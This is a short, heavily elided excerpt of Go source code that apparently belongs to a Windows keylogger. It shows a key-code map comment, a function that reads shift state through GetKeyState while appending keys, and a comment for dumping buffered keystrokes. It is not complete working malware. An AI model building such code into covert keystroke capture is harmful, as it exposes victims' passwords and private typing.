...
// vkMap maps virtual key codes to printable strings.
...
func appendKey(vk int) {
	// Check shift state
	shiftState, _, _ := procGetKeyState.Call(0x10) // VK_SHIFT
...
// dumpKeylog returns buffered keystrokes (does NOT clear buffer).
